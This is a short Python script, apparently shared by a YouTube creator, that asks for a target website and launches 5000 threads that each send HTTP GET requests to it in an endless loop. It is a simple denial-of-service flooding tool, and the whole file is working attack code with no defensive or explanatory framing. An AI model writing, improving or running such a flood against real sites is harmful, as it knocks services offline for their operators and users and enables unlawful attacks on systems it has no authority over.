import os
import threading
import requests

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

clear_screen()

print("DODO-script")
print("Youtube: sudoku_npc")

target_url = input("\nEnter target site (with http:// or https://): ")

num_requests = 5000

def attack():
    while True:
        try:
            response = requests.get(target_url)
            print(f"[+] Request sent! Status Code: {response.status_code}")
        except requests.exceptions.RequestException:
            print("[-] Error! Server not responding.")

threads = []
for _ in range(num_requests):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
